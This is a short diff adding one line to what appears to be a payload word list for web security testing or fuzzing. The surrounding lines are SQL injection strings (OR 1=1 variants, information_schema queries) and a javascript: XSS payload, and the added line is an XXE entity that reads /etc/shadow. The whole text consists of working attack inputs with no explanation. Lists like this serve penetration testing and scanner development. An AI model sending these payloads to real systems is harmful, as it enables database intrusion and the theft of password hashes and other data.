@@ -5,6 +5,7 @@
 <img src="javascript:alert(\'XSS\');">
 '))) AND 1=1,SELECT * FROM information_schema.tables ((('
 ' )) AND 1=1 (( ' -- rgzd
+<!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>
 ;SELECT * FROM information_schema.tables WHERE 2>1 AND 1=1 OR 2=2 -- qdEf '
 ' OR '1'=1 '"
 ') OR "a"="a --
